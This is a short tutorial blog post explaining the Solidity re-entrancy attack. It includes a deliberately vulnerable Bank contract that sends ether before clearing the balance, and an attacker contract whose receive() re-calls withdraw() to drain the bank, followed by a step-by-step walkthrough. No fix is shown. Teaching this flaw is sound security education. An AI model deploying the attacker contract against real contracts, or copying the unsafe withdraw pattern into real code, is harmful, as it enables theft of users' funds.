---
title: Solidity Attacks => Re-Entrancy
date: 2024-04-19 
categories: [solidity]
tags: [solidityattacks]     
description: Re-entrancy attack explained
---

Below is a vulnerable contract

```
pragma solidity ^0.8;

contract Bank {
    mapping(address => uint) balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        require(balance[msg.sender] != 0, "No Balance");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(success, "Fail Sending");

        balance[msg.sender] = 0;
    }

    function getBalance(address _addr) public view returns (uint){
        return balance[_addr];
    }

    // The call will be put on hold till the receive function in the other contract is done executing, so 
    // if the recevie function calls withdraw() again the require(balance[msg.sender]!=0) is bypassed.
}

contract BankAttack {

    Bank bank;

    constructor(address _addr) payable {
        bank = Bank(_addr);
    }

    function deposit(uint val) public payable {
        bank.deposit{value: val}();
    }

    function attack() public {
        bank.withdraw();
    }

    receive() external payable { 
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }

        // If statement used because it more like loops. The new withdraw function will call receive again and so until balance is 0, withdraw() is called.
    }
}
```

- Bank contract is deployed, users send money to it and it has a total of 7 eth.
- Attacker deposit say 1 ether, so now attacker has a balance of 1 ether.

- BankAttacker calls the attack() function , it calls withdraw function since "balance[msg.sender] != 0" is true.
- Withdraw sends 1 ether to attackers receive function and the withdraw call frame after execution is paused until attacker's receive is executed.

- Now the receive function calls withdraw again, "balance[msg.sender] != 0" is still true because it comes after the call frame.
- The withdraw function again sends 1 ether to attackers receive function. Again the receive function calls withdraw(), still the balance is not updated.

So until "address(bank).balance >= 1 ether" is true this more like a loop keeps on going. The Bank Contract is no drained and the attacker has 8 eth now.
